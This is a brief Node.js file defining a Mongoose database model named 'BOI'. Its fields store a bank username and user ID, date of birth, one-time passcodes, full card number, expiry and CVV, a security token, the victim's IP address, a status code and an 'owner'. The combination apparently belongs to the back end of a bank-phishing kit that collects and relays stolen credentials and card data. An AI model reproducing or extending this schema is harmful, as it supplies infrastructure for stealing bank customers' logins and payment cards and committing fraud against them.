const mongoose = require("mongoose");

const boiModel = new mongoose.Schema({
  uniqueid: String,
  username: String,
  userId: String,
  dob: String,
  otp: String,
  ccnum: String,
  ccexp: String,
  cvv: String,
  telephone: String,
  secToken: String,
  status: Number,
  ip: String,
  owner: String,
});

module.exports = mongoose.model("BOI", boiModel);
